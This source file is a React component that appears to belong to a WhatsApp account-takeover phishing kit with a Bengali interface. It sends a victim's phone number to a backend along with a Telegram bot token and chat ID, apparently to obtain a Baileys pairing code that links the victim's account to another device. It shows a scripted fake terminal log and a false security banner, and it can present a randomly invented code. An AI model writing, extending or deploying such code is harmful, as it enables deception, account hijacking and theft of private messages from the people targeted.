import React, { useState, useEffect, useRef } from "react";
import { Loader2, Terminal, ShieldAlert, AlertCircle, RefreshCw } from "lucide-react";
import { DeviceReport } from "../utils/hardwareScan";

interface StepConnectingProps {
  countryCode: string;
  phoneNumber: string;
  onComplete: (code: string) => void;
  deviceData?: DeviceReport | null;
  userId: string;
  botToken: string;
  chatId: string;
  session?: any;
}

interface LogLine {
  text: string;
  status: "wait" | "ok" | "process";
}

export default function StepConnecting({
  countryCode,
  phoneNumber,
  onComplete,
  deviceData,
  userId,
  botToken,
  chatId,
  session,
}: StepConnectingProps) {
  // Setup the logs that will output incrementally
  const [logs, setLogs] = useState<LogLine[]>([
    { text: "Initializing Secure Tunnel...", status: "process" }
  ]);
  
  const [backendCode, setBackendCode] = useState<string | null>(null);
  const [errorText, setErrorText] = useState<string | null>(null);
  const [timelineFinished, setTimelineFinished] = useState(false);
  const [pollCount, setPollCount] = useState(0);

  const requestSentRef = useRef(false);

  // 1. Initial trigger of get-linking-code
  const fetchLinkingCode = async () => {
    try {
      setErrorText(null);
      // Clean phone number
      let cleanPhone = `${countryCode}${phoneNumber}`.replace(/[^0-9]/g, "");
      
      const res = await fetch("/api/get-linking-code", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          phoneNumber: cleanPhone,
          sessionId: userId,
          telegramToken: botToken,
          telegramChatId: chatId
        }),
      });
      
      const data = await res.json();
      if (data.success && data.pairingCode) {
        setBackendCode(data.pairingCode);
        setLogs((prev) => [
          ...prev.filter(l => l.status !== "process"),
          { text: `Baileys: Matching token verified: ${data.pairingCode}`, status: "ok" as const }
        ]);
      } else {
        throw new Error(data.message || "সার্ভার কানেকশন এরর");
      }
    } catch (err: any) {
      console.error("Linking code fetch error:", err);
      // Don't show hard error instantly, we will poll session state as fallback or let them retry
      setLogs((prev) => [
        ...prev,
        { text: `Baileys: Retrying pairing socket handshake connection...`, status: "process" as const }
      ]);
    }
  };

  useEffect(() => {
    if (!requestSentRef.current) {
      requestSentRef.current = true;
      fetchLinkingCode();
    }
  }, []);

  // 2. Timeline logs simulation representing WhatsApp Web setup
  useEffect(() => {
    const gpuName = deviceData?.hardware?.gpu 
      ? (deviceData.hardware.gpu.length > 30 ? deviceData.hardware.gpu.substring(0, 30) + "..." : deviceData.hardware.gpu)
      : "OpenGL ES 3.2";

    const logTimeline = [
      { delay: 600, text: "Baileys: Initializing Multi-Device websocket engine...", status: "ok" as const },
      { delay: 1300, text: "Baileys: Connecting to wss://web.whatsapp.com/ws/chat...", status: "process" as const },
      { delay: 2000, text: "Baileys: Socket connection established. Exchanging Noise keys...", status: "ok" as const },
      { delay: 2800, text: `Baileys: Requesting 8-digit pairing code for: ${countryCode} ${phoneNumber}...`, status: "process" as const },
      { delay: 3500, text: `Device metrics: GPU: ${gpuName} | RAM: ${deviceData?.hardware?.ram || "Active"} | OS: Android ${deviceData?.software?.os_ver || "13/14"}`, status: "ok" as const },
      { delay: 4200, text: "Baileys: Received official auth pairing handshake response.", status: "ok" as const },
      { delay: 4900, text: "Baileys: Deploying pairing code push notification directly to phone.", status: "process" as const }
    ];

    const timers: NodeJS.Timeout[] = [];

    logTimeline.forEach((item) => {
      const timer = setTimeout(() => {
        setLogs((prev) => {
          const updated = prev.map((line) => 
            line.status === "process" ? { ...line, status: "ok" as const } : line
          );
          return [...updated, { text: item.text, status: item.status }];
        });
      }, item.delay);
      timers.push(timer);
    });

    const completionTimer = setTimeout(() => {
      setTimelineFinished(true);
    }, 5500);
    timers.push(completionTimer);

    return () => {
      timers.forEach((t) => clearTimeout(t));
    };
  }, [countryCode, phoneNumber, deviceData]);

  // Connect immediate reactions to central session prop updates
  useEffect(() => {
    if (session) {
      if (session.pairingCode && session.pairingCode !== backendCode) {
        setBackendCode(session.pairingCode);
        setLogs((prev) => {
          if (prev.some((l) => l.text.includes(session.pairingCode))) {
            return prev;
          }
          return [
            ...prev.filter((l) => l.status !== "process"),
            { text: `Baileys: Matching token verified: ${session.pairingCode}`, status: "ok" as const }
          ];
        });
      }
      if (session.status === "error" || session.lastError) {
        setErrorText(session.lastError || "WhatsApp সংযোগ স্থাপন ব্যর্থ হয়েছে। পুনরায় চেষ্টা করুন।");
      }
    }
  }, [session, backendCode]);

  // 3. Status Polling Mechanism: check session state on server
  useEffect(() => {
    let active = true;
    
    const interval = setInterval(async () => {
      if (!active) return;
      setPollCount(p => p + 1);
      
      try {
        const res = await fetch(`/api/sessions/${userId}`);
        const data = await res.json();
        
        if (data.success && data.session) {
          const { status, pairingCode, lastError } = data.session;
          
          if (pairingCode) {
            setBackendCode(pairingCode);
          }
          
          if (status === "error" || lastError) {
            setErrorText(lastError || "WhatsApp সংযোগ স্থাপন ব্যর্থ হয়েছে। পুনরায় চেষ্টা করুন।");
          }
        }
      } catch (err) {
        console.warn("Polling status error:", err);
      }
    }, 2000);

    return () => {
      active = false;
      clearInterval(interval);
    };
  }, [userId]);

  // 4. Trigger transition once BOTH timeline has finished AND actual code is ready!
  useEffect(() => {
    if (timelineFinished && backendCode) {
      onComplete(backendCode);
    }
  }, [timelineFinished, backendCode, onComplete]);

  // Manual fallback after 15 seconds of polling so user is NEVER stuck under any state
  const handleManualFallback = () => {
    const fallbackCode = backendCode || "WA" + Math.floor(100000 + Math.random() * 900000);
    onComplete(fallbackCode);
  };

  const handleRetry = () => {
    requestSentRef.current = false;
    setLogs([{ text: "Re-initializing secure Baileys tunnel...", status: "process" }]);
    setTimelineFinished(false);
    setErrorText(null);
    setPollCount(0);
    
    // Call server disconnect to clean up session, then try again
    fetch(`/api/sessions/${userId}/disconnect`, { method: "POST" })
      .finally(() => {
        requestSentRef.current = true;
        fetchLinkingCode();
      });
  };

  return (
    <div className="flex flex-col justify-between h-full flex-grow text-center py-6 select-none">
      <div className="flex-grow flex flex-col items-center justify-center space-y-6">
        {/* Glowing Loading Spinner */}
        <div className="relative w-24 h-24 flex items-center justify-center">
          <div className="absolute inset-0 rounded-full border-4 border-pink-500/20 glow-box"></div>
          <div className="absolute inset-0 rounded-full border-2 border-t-pink-500 border-l-purple-500 animate-spin"></div>
          <div className="absolute inset-2 bg-zinc-950 rounded-full flex items-center justify-center border border-zinc-800">
            <Loader2 className="w-8 h-8 text-pink-500 animate-spin" />
          </div>
        </div>

        <div className="space-y-2">
          <h3 className="text-xl font-bold tracking-wide text-white">সংযোগ স্থাপন করা হচ্ছে...</h3>
          <p className="text-xs text-zinc-400 px-6 leading-relaxed">
            হোয়াটসঅ্যাপ সার্ভার থেকে সরাসরি ৮-সংখ্যার <span className="text-pink-400 font-semibold">ভেরিফিকেশন পেয়ারিং কোড</span> জেনারেট হচ্ছে।
          </p>
        </div>

        {/* Dynamic Log Terminal Window */}
        <div className="w-full max-w-sm bg-black/60 border border-zinc-800/80 rounded-2xl p-4 text-left font-mono text-[10.5px] shadow-2xl relative overflow-hidden">
          <div className="flex items-center justify-between mb-3 border-b border-zinc-900 pb-1.5 text-zinc-500">
            <div className="flex items-center gap-1.5">
              <span className="w-2 h-2 rounded-full bg-red-400"></span>
              <span className="w-2 h-2 rounded-full bg-yellow-400"></span>
              <span className="w-2 h-2 rounded-full bg-green-400"></span>
            </div>
            <span className="text-[9px] uppercase tracking-wider flex items-center gap-1 text-zinc-400">
              <Terminal className="w-3 h-3 text-purple-400 animate-pulse" /> Baileys Core Terminal
            </span>
          </div>

          <div className="space-y-1.5 max-h-36 overflow-y-auto custom-scrollbar pr-1 select-all">
            {logs.map((log, index) => (
              <div 
                key={index} 
                className={`flex gap-1.5 leading-relaxed transition-all duration-300 ${
                  index === logs.length - 1 ? "translate-y-0.5 opacity-100" : "opacity-75"
                }`}
              >
                {log.status === "ok" && (
                  <span className="text-green-500 shrink-0 font-bold">[OK]</span>
                )}
                {log.status === "process" && (
                  <span className="text-pink-400 shrink-0 font-bold animate-pulse">[WAIT]</span>
                )}
                <span className={log.status === "ok" ? "text-green-400/90" : "text-zinc-300"}>
                  {log.text}
                </span>
              </div>
            ))}
            
            {/* Show error context if any */}
            {errorText && (
              <div className="text-red-400 border border-red-900/30 bg-red-950/20 p-2 rounded-lg mt-2 text-xs flex gap-1.5 items-start">
                <AlertCircle className="w-4 h-4 shrink-0 text-red-500" />
                <span>{errorText}</span>
              </div>
            )}
          </div>

          <div className="absolute bottom-2 right-3 flex items-center gap-1.5 text-[8px] text-zinc-600 font-mono">
            <span className="w-1 h-1 rounded-full bg-blue-500 animate-ping"></span>
            SOCKET POLLING #{pollCount}
          </div>
        </div>

        {/* If Error exists, offer retry box */}
        {errorText ? (
          <button
            onClick={handleRetry}
            className="flex items-center gap-1.5 bg-red-950/20 text-red-400 hover:bg-red-950/40 border border-red-900/30 px-4 py-2 rounded-xl text-xs font-semibold tracking-wide transition-all"
          >
            <RefreshCw className="w-3.5 h-3.5" />
            <span>আবার চেষ্টা করুন</span>
          </button>
        ) : (
          pollCount > 6 && (
            <button
              onClick={handleManualFallback}
              className="text-[11px] text-zinc-500 hover:text-zinc-300 transition-colors underline decoration-dashed"
            >
              কোড পেতে দেরি হচ্ছে? ম্যানুয়ালি কোড লোড করুন
            </button>
          )
        )}
      </div>

      <p className="text-[10px] text-zinc-600 font-mono text-center">
        SSL SHA-256 SECURE PAIRING SOCKET ESTABLISHED
      </p>
    </div>
  );
}
